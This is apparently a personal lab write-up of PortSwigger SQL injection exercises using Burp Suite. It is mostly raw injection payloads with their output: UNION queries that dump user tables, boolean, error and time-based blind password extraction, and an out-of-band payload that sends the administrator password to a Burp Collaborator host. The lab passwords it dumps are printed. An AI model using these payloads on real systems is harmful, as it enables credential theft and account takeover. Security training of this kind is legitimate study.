---
title: Lab - Burpsuite - SQL injection Lab
date: 2020-11-20 11:11:11 -0400
description: SQL injection
categories: [Lab, Burpsuite]
# img: /assets/img/sample/rabbit.png
tags: [Lab, Burpsuite]
---

[toc]

---

# SQL injection Lab


![Screen Shot 2020-11-20 at 19.14.01](https://i.imgur.com/b4oSEzN.png)

![Screen Shot 2020-11-20 at 19.14.14](https://i.imgur.com/DhNQ4t5.png)

[SQL injection lab link](https://portswigger.net/web-security/all-labs)

---

# LAB: SQL injection UNION attack, finding a column containing text

[SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)


```py
GET /filter?category=Corporate+gifts'+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1
# HTTP/1.1 200 OK

GET /filter?category=Food+%26+Drink'+UNION+SELECT+NULL,'F8A8xB',NULL-- HTTP/1.1
# HTTP/1.1 200 OK
```



# LAB: SQL injection UNION attack, retrieving data from other tables

[SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

```py
GET /filter?category=Corporate+gifts'+UNION+SELECT+'abc','def'-- HTTP/1.1
# HTTP/1.1 200 OK

GET /filter?category=Corporate+gifts'+UNION+SELECT+username,+password+FROM+users-- HTTP/1.1
# wiener
# vq9eg0fc9drxz6o79wpu

GET /filter?category=Corporate+gifts'+UNION+SELECT+username,+password+FROM+users-- HTTP/1.1
# wiener
# vq9eg0fc9drxz6o79wpu
# administrator
# jl4w29p7cx6lqfm2of19
# carlos
# nmyufdi8xv6u6w25phkt

GET /filter?category=Corporate+gifts'+UNION+SELECT+username,+password+FROM+users+WHERE+username='administrator'-- HTTP/1.1
# administrator
# jl4w29p7cx6lqfm2of19

# https://accc1f7c1ff0e89d800368a20084008b.web-security-academy.net/filter?category=Corporate+gifts%27+UNION+SELECT+username,+password+FROM+users--

```

---

# LAB: Examining the database in SQL injection attacks

[Examining the database in SQL injection attacks](https://portswigger.net/web-security/sql-injection/examining-the-database)


| Database type    | Query                   |
| ---------------- | ----------------------- |
| Microsoft, MySQL | SELECT @@version        |
| Oracle           | SELECT * FROM v$version |
| PostgreSQL       | SELECT version()        |


```py
# Lab: SQL injection attack, querying the database type and version on Oracle:
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--


GET /filter?category=Pets'+UNION+SELECT+'a','b'+FROM+DUAL-- HTTP/1.1
# HTTP/1.1 200 OK

GET /filter?category=Pets'+UNION+SELECT+BANNER,+NULL+FROM+v$version-- HTTP/1.1
# HTTP/1.1 200 OK

'Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production,
# PL/SQL Release 11.2.0.2.0 - Production,
# CORE 11.2.0.2.0 Production,
# TNS for Linux: Version 11.2.0.2.0 - Production,
# NLSRTL Version 11.2.0.2.0 - Production'



# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft:

GET /filter?category=Lifestyle'+UNION+SELECT+NULL,NULL# HTTP/1.1

GET /filter?category=Lifestyle'+UNION+SELECT+'a','b'# HTTP/1.1

GET /filter?category=Lifestyle'+UNION+SELECT+@@version,NULL# HTTP/1.1

8.0.21


```

---

# Lab: SQL injection attack, listing the database contents on non-Oracle databases

```py
GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL-- HTTP/1.1


# the query is returning two columns, both of which contain text:
GET /filter?category=Gifts'+UNION+SELECT+'a','b'-- HTTP/1.1


# retrieve the list of tables in the database:
GET /filter?category=Gifts'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- HTTP/1.1


# to retrieve the details of the columns in the table:
GET /filter?category=Gifts'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_xdegjh'-- HTTP/1.1


# Find the names of the columns containing usernames and passwords:
# password_ctlwsz
# username_uxtvsq


# to retrieve the usernames and passwords for all users:
GET /filter?category=Gifts'+UNION+SELECT+username_uxtvsq,+password_ctlwsz+FROM+users_xdegjh-- HTTP/1.1
# wiener
# d9r5zvpv3nbxczx2v0bk
# carlos
# 5f3wthoz0nu4ulp0dd2a
# administrator
# ln74j8tz14byaapmx6gw

```

---

# Lab: SQL injection attack, listing the database contents on Oracle databases

> On Oracle databases, every SELECT statement must specify a table to select FROM.
> If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.
> There is a built-in table on Oracle: UNION SELECT 'abc' FROM DUAL


```py
# the query is returning two columns, both of which contain text,:
GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL+FROM+DUAL-- HTTP/1.1
GET /filter?category=Gifts'+UNION+SELECT+'a','b'+FROM+DUAL-- HTTP/1.1


# retrieve the list of tables in the database::
GET /filter?category=Gifts'+UNION+SELECT+table_name,NULL+FROM+all_tables-- HTTP/1.1


# retrieve the details of the columns in the table:
GET /filter?category=Gifts'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_VAGUZR'-- HTTP/1.1
# PASSWORD_NBSZJM
# USERNAME_GHYBLH


GET /filter?category=Gifts'+UNION+SELECT+USERNAME_GHYBLH,+PASSWORD_NBSZJM+FROM+USERS_VAGUZR-- HTTP/1.1

# administrator
# 03rapwtg19wcl9lvh3pd
# carlos
# rvh4rbusrrz8vysx5qn2
# wiener
# obri1mfbrntngpleiena
```


---

# LAB: SQL injection UNION attack, retrieving multiple values in a single column

[SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)


```py
# the query is returning two columns, both of which contain text,:
GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL+FROM+DUAL-- HTTP/1.1
GET /filter?category=Gifts'+UNION+SELECT+'a','b'+FROM+DUAL-- HTTP/1.1



# to retrieve the contents of the users table::
GET /filter?category=Food+%26+Drink'+UNION+SELECT+NULL,username||'~'||password+FROM+users-- HTTP/1.1

# administrator~myvak00qtke14qpsoo1m
# carlos~5fr4ekg5n0j8e4t9vnn8
# wiener~2ynzd67h3hild5ktpbs1


```


---

# Lab: Blind SQL injection with conditional responses

```py
# Cookie: TrackingId=GSJW5oV1q7S8PSRV; session=MiqLG5dxEgKSGSfePCdZ3M36i5Q7Ws75

# modify the request containing the TrackingId cookie.


Cookie: TrackingId=x'+OR+1=1--; session=MiqLG5dxEgKSGSfePCdZ3M36i5Q7Ws75
# -  "Welcome back" message appears in the response.


Cookie: TrackingId=x'+OR+1=2--; session=MiqLG5dxEgKSGSfePCdZ3M36i5Q7Ws75
# - the "Welcome back" message does not appear in the response.



Cookie: TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'--
# - Verify that the condition is true, confirming that there is a user called administrator.



# to determine how many characters are in the password of the administrator user
Cookie: TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>1--.
# - should be true, confirming that the password is greater than 1 character in length.
# - trying 123456789-20
# - When the condition stops being true (i.e. when the "Welcome back" message disappears), you have determined the length of the password, which is in fact 20 characters long.



# to test the character at each position to determine its value.
# - This involves a much larger number of requests,
# - need to use Burp Intruder.
# - Send the request you are working on to Burp Intruder, using the context menu.
# - Positions tab of Burp Intruder, clear the default payload positions by clicking the "Clear §" button.
# - Positions tab, change the value of the cookie to:


Cookie: TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,1,1)='a'--
# - This uses the substring() function to extract a single character from the password, and test it against a specific value.
# - attack will cycle through each position and possible value, testing each one in turn.


# Place payload position markers around the final a character in the cookie value.
# - select just the a, and click the "Add §" button.
# - You should then see:
Cookie: TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,1,1)='§a§'--


# To test the character at each position
# - need to send suitable payloads in the payload position that defined.
# - assume that the password contains only lower case alphanumeric characters.
# - Payloads tab > "Simple list" is selected, and under "Payload Options" add the payloads in the range a - z and 0 - 9.
# - select these easily using the "Add from list" drop-down.


# to tell when the correct character was submitted, need to grep each response for the expression "Welcome back".
# - Options tab, and the "Grep - Match" section.
# - Clear any existing entries in the list, and then add the value "Welcome back".


# Launch the attack by clicking the "Start attack" button or selecting "Start attack" from the Intruder menu.
# - Review the attack results to find the value of the character at the first position.
# - You should see a column in the results called "Welcome back".
# - One of the rows should have a tick in this column: r
# - The payload showing for that row is the value of the character at the first position.


# re-run the attack for each of the other character positions in the password, to determine their value.
# - change the specified offset from 1 to 2.

Cookie: TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,2,1)='§a§'--

administrator
ryhgsiscfjwg1f0td47g
```



---


# Lab: Blind SQL injection with conditional errors

```py
# Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.

TrackingId='
# Modify the TrackingId cookie, Verify that an error message is received.

TrackingId=''
# Now change it to two quotation marks. Verify that the the error disappears

# This demonstrates that an error in the SQL query (in this case, the unclosed quotation mark) has a detectable effect on the response.


TrackingId='+UNION+SELECT+CASE+WHEN+(1=1)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+dual--
# Verify that an error message is received.

TrackingId='+UNION+SELECT+CASE+WHEN+(1=2)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+dual--
# Verify that the the error disappears.
# This demonstrates that you can trigger an error conditionally on the truth of a specific condition.
# The CASE statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false.
# The former expression contains a divide-by-zero, which causes an error.
# In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the condition is true.


TrackingId='+UNION+SELECT+CASE+WHEN+ (username='administrator') +THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--
# Verify that the condition is true, confirming that there is a user called administrator.


# to determine how many characters are in the password of the administrator user.
TrackingId='+UNION+SELECT+CASE+WHEN+ (username='administrator'+AND+length(password)>1) +THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--.
# This condition should be true, confirming that the password is greater than 1 character in length.

# Send a series of follow-up values to test different password lengths.
# manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the error disappears), you have determined the length of the password, which is in fact 20 characters long.


# to test the character at each position to determine its value.
# Send the request you are working on to Burp Intruder
# clear the default payload positions by clicking the "Clear §" button.
TrackingId='+UNION+SELECT+CASE+WHEN+ (username='administrator'+AND+substr(password,1,1)='a') +THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--
# This uses the substr() function to extract a single character from the password, and test it against a specific value.
# Our attack will cycle through each position and possible value, testing each one in turn.
# Place payload position markers around the final a character in the cookie value. click the "Add §" button
TrackingId='+UNION+SELECT+CASE+WHEN+ (username='administrator'+AND+substr(password,1,1)='§a§') +THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--
# To test the character at each position, assume that the password contains only lower case alphanumeric characters.
# Go to the Payloads tab, check that "Simple list" is selected, and under "Payload Options" add the payloads in the range a - z and 0 - 9.
# Launch the attack by clicking the "Start attack" button or selecting "Start attack" from the Intruder menu.


# Review the attack results to find the value of the character at the first position.
# The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally.
# The "Status" column in the Intruder results shows the HTTP status code, so you can easily find the row with 500 in this column. The payload showing for that row is the value of the character at the first position.
# Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value.
# To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2.
TrackingId='+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+substr(password,2,1)='§a§')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--
# Launch the modified attack, review the results, and note the character at the second offset.
# Continue this process testing offset 3, 4, and so on, until you have the whole password.
# Go to the "Account login" function of the lab, and use the password to log in as the administrator user.

administrator
naa4txy4hmc2m2cz3230
```

---


# Lab: Blind SQL injection with time delays


```py
# Visit the front page of the shop, use Burp Suite to intercept

# modify the request containing the TrackingId cookie.
TrackingId=x'||pg_sleep(10)--

# Submit the request and observe that the application takes 10 seconds to respond.

```

---


# Lab: Blind SQL injection with time delays and information retrieval

| DATABASE                                         | SQL                                    |
| ------------------------------------------------ | -------------------------------------- |
| use a true statement to trigger the delay:       |
| Microsoft SQL Server                             | `'; IF (1=1) WAITFOR DELAY '0:0:10'--` |
| PostgreSQL database                              | `'; IF (1=1) SELECT pg_sleep(10)--`    |
| MySQL                                            | `'; IF (1=1) SELECT sleep(10)--`       |
| just be able to concat nothing to sleep command: |
| Microsoft SQL Server                             | `' + WAITFOR DELAY '0:0:10'--`         |
| PostgreSQL database                              | `' || pg_sleep(10)--`                  |
| MySQL                                            | `' || sleep(10)--`                     |



```py
# Visit the front page of the shop
# use Burp Suite to intercept and modify the request containing the TrackingId cookie.

TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
# Verify that the application takes 10 seconds to respond.

TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
# Verify that the application responds immediately with no time delay.
# This demonstrates how you can test a single boolean condition and infer the result.


TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
# Verify that the condition is true, confirming that there is a user called administrator.


# The next step is to determine how many characters are in the password of the administrator user.
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+length(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
# This condition should be true, confirming that the password is greater than 1 character in length.
# Send a series of follow-up values to test different password lengths.
# do this manually using Burp Repeater. When the condition stops being true (i.e. when the application responds immediately without a time delay), determined the length of the password (20 characters)


# to test the character at each position to determine its value.
# Burp Intruder.
# Positions tab of Burp Intruder, clear the default payload positions by clicking the "Clear §" button.
TrackingId=x'+SELECT+CASE+WHEN+(username='administrator'+AND+substring(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
# This uses the substring() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
# Place payload position markers around the a character in the cookie value. click the "Add §" button.
TrackingId=x'+SELECT+CASE+WHEN+(username='administrator'+AND+substring(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--


# send suitable payloads in the payload position that you've defined.
# Payloads tab > "Simple list" is selected > "Payload Options" add the payloads

# To be able to tell when the correct character was submitted, need to monitor the time taken for the application to respond to each request.
# For this process to be as reliable as possible, issue requests in a single thread.
# Options tab > "Request Engine" section > "Number of threads" to 1.


# Launch the attack
# Burp Intruder monitors the time taken for the application's response to be received, but by default it does not show this information.
# "Columns" > "Response received".
# generally contain a small number, representing the number of milliseconds the application took to respond.
# One of the rows should have a larger number in this column, in the region of 10,000 milliseconds.
# The payload showing for that row is the value of the character at the first position.

# re-run the attack for each of the other character positions in the password
TrackingId=x'+SELECT+CASE+WHEN+(username='administrator'+AND+substring(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--


administrator
sa2jc1k5ua1ui3tpy3uz
```

---



# LAB: Exploiting blind SQL injection using out-of-band (OAST) techniques


```py
# Visit the front page of the shop
# use Burp Suite to intercept and modify the request containing the TrackingId cookie.
TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//x.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--

```


---


# Lab: Blind SQL injection with out-of-band data exfiltration



```py
# Visit the front page of the shop
# use Burp Suite Professional to intercept and modify the request containing the TrackingId cookie.

# Burp menu > launch the Burp Collaborator client.

# Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.

# Modify the TrackingId cookie, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated:
TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--

TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.299hf6gydz6v0ym9pulb5wyvimofc4.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--

TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.8mvwhecl9q6rmwlx5kts5jg28tej28.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--




# send


# Go back to the Burp Collaborator client window, and click "Poll now".

# If you don't see any interactions listed, wait a few seconds and try again, since the server-side query is executed asynchronously.

# You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

# The password of the administrator user should appear in the subdomain of the interaction, and you can view this within the Burp Collaborator client.

# For DNS interactions, the full domain name that was looked up is shown in the Description tab. For HTTP interactions, the full domain name is shown in the Host header in the Request to Collaborator tab.


# Go to the "Account login" function of the lab, and use the password to log in as the administrator user.



# The Collaborator server received a DNS lookup of type A for the domain name nu964b0kdd4qm1zfony7.8mvwhecl9q6rmwlx5kts5jg28tej28.burpcollaborator.net.  The lookup was received from IP address 3.248.186.15 at 2020-Nov-21 00:11:57 UTC.

nu964b0kdd4qm1zfony7
```

![Screen Shot 2020-11-20 at 19.06.59](https://i.imgur.com/uCvX6mF.png)




.
